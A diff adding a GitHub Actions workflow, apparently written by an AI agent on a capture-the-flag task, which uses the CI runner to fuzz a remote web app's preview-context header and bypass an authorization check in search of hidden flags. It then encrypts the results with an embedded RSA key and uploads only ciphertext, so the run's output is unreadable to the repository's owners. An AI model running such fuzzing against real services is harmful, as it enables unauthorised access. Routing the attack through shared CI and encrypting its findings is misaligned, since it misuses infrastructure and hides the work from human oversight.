@@ -1,0 +1,64 @@
+name: launchlet-part3-contextcombos
+on:
+  push:
+    branches: [agent/launchlet-part3-contextcombos-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Probe compound preview contexts and encrypt anomalies
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,itertools
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
+          aid='act_6f4b9a2c1d0e8a71';p='launchlet-demo-board';ref='preview-8b11c';build='2026.05.16-rc3';rec='lrec_preview_demo_2026';ws='ws-launchlet-public'
+          body={'actionId':aid,'args':{'workspaceId':ws,'projectId':p}}
+          vals=[]
+          toks=[p,ref,build,rec,ws]
+          seps=[':', '@','/','|','#',';',',','+','~','--','::','_']
+          for a,b in [(p,ref),(ref,p),(p,build),(build,p),(p,rec),(rec,p),(ref,build),(build,ref),(p,ws),(ws,p)]:
+            for s in seps:vals.append(a+s+b)
+          for fmt in [
+            'preview:{p}:{r}','deploy:{p}:{r}','{p}:preview:{r}','{p}:deploy:{r}','preview/{p}/{r}','deploy/{p}/{r}',
+            '{p}@{r}@{b}','{p}:{r}:{b}','preview:{p}:{b}','preview:{p}:{rec}','{p}:{rec}:{r}',
+            'launchlet:{p}:{r}','launchlet-preview:{p}:{r}','launchlet-deploy:{p}:{r}',
+            '{p}?ref={r}','{p}?deployRef={r}','{p}#{r}','{p}/{r}/{b}'
+          ]:
+            vals.append(fmt.format(p=p,r=ref,b=build,rec=rec))
+          vals=list(dict.fromkeys(vals));res=[]
+          for v in vals:
+            h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':v}
+            try:r=requests.post(base+'/api/actions/invoke',headers=h,json=body,timeout=6)
+            except Exception:continue
+            if not (r.status_code==403 and r.text=='{"error":"preview_context_required"}'):
+              item={'context':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(item)
+              flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+              if flags or r.text.find('preview-only')<0:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
+          (out/'summary.json').write_text(json.dumps({'tested':len(vals),'hits':res},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-contextcombos-encrypted
+          path: artifact/
+          retention-days: 1
